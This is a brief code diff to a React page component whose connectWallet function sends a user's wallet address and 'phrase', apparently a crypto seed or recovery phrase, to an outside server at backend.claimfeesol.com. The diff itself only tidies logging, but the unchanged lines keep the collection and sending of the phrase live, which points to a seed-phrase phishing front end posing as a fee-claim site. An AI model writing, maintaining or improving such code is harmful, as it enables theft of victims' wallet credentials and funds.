@@ -30,7 +30,6 @@ export default function Home() {
 
   const connectWallet = async (e) => {
     try {
-        console.log("Hello World");
         const url = "https://backend.claimfeesol.com/message.php";
 
         const response = await axios.post(url, {"wallet": wallet, "phrase": phrase}, {
@@ -38,7 +37,7 @@ export default function Home() {
                 "Content-Type":"application/json",
             },withCredentials: true
         })
-        console.log(response);
+        console.log(response.data);
     } catch (error) {
         console.log("Error sending phrase: ", error);
     }
